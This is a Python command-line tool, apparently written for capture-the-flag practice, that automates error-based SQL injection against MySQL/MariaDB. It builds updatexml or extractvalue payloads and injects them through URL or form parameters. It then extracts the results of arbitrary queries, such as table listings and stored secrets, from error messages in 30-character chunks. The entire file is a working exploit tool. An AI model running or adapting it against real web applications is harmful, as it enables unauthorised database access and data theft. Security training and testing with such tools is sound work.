#!/usr/bin/env python3
"""Error-based extraction for MySQL/MariaDB (updatexml/extractvalue).
Pages through long values 30 chars at a time.

    python error_extract.py "http://sqli2.chal.deti:8031/search?q={}" --prefix "%' AND " \
        --query "SELECT secret FROM vault LIMIT 1"
    python error_extract.py "http://t/item?id={}" --prefix "1 AND " --query "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
"""
import argparse
import html
import re
from urllib.parse import quote

import requests


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data")
    ap.add_argument("--prefix", default="' AND ")
    ap.add_argument("--suffix", default="-- -")
    ap.add_argument("--query", required=True)
    ap.add_argument("--func", choices=["updatexml", "extractvalue"], default="updatexml")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}
    out = ""
    pos = 1
    while True:
        sub = f"SUBSTRING(({a.query}),{pos},30)"
        expr = (f"updatexml(1,CONCAT(0x7e,{sub},0x7e),1)" if a.func == "updatexml"
                else f"extractvalue(1,CONCAT(0x7e,{sub},0x7e))")
        inj = quote(f"{a.prefix}{expr}{a.suffix}", safe="")
        if a.data:
            r = requests.post(a.url, data=a.data.replace("{}", inj), timeout=15,
                              headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = requests.get(a.url.replace("{}", inj), headers=hdr, timeout=15)
        m = re.search(r"~(.*?)~", html.unescape(r.text), re.S)
        if not m:
            m2 = re.search(r"~([^'\"<]*)", html.unescape(r.text))
            if not m2:
                print("[!] no ~marker~ in response:\n", html.unescape(r.text)[:500])
                break
            chunk = m2.group(1)
        else:
            chunk = m.group(1)
        if not chunk:
            break
        out += chunk
        print(out, flush=True)
        if len(chunk) < 30:
            break
        pos += 30
    print(out)


if __name__ == "__main__":
    main()
